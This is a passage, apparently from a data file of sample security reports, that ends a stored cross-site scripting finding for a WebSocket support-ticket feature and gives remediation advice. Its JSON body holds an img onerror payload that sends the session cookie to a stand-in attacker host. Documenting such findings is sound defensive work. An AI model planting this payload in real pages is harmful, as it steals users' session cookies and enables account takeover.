  "ticketId": 9812,
  "content": "<img src=x onerror=this.src='https://attacker-c2.com/steal?c='+document.cookie>"
}
\`\`\`

4. Open the support ticket in another browser session.
5. Observe that the payload executes instantly, making a request to the attacker's server with the session cookie.

---

## Remediation:
- HTML-encode all dynamic values received over WebSockets before rendering them into the DOM (e.g. use \`textContent\` instead of \`innerHTML\`).
- Apply content sanitization on the server before broadcasting WebSocket frames to other clients.`,
  },
];
